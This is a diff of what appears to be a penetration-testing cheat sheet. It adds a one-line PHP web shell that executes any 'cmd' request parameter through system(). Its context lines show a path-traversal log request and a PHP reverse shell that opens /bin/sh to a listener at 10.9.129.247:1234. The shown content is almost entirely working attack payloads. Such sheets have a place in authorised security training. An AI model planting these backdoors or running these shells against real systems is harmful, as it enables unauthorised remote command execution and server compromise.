@@ -481,6 +481,12 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apa
 php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
+- Oneline backdoor
+
+```php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+```
+
 ## SSTI
 
 Server-Side Template Injection
